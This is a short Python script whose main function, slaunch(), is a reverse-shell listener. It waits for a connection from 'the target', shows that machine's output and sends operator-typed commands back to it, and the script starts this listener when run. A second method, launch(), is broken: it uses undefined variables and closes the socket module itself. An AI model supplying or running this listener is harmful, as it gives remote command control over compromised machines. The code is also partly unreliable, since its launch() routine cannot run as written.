import socket
import sys
import time
from threading import Thread

class Server():
    def __init__(self):
        pass

    @staticmethod
    def launch():
        host, port = ('', 80)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((host,port))
        print('Socket initialized...')
        s.listen(5)

        while True:
            (client, address) = s.accept()
            print('client connected...')
            print(f'Client address: {addr}')
            msg = 'test'
            try:
                client.send(msg.encode('utf-8'))
            except Exception as e:
                print('except on run_tcp_server: ', e)

            conn.close()
            socket.close()


    @staticmethod
    def slaunch(port = 80):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', port))
        s.listen(1)
        print("Listening on port " + str(port))
        conn, addr = s.accept()
        print('Connection received from ',addr)
        while True:
            #Receive data from the target and get user input
            ans = conn.recv(1024).decode()
            sys.stdout.write(ans)
            command = input()

            #Send command
            command += "\n"
            conn.send(command.encode())
            time.sleep(1)

            #Remove the output of the "input()" function
            sys.stdout.write("\033[A" + ans.split("\n")[-1])


server = Server()
server.slaunch()
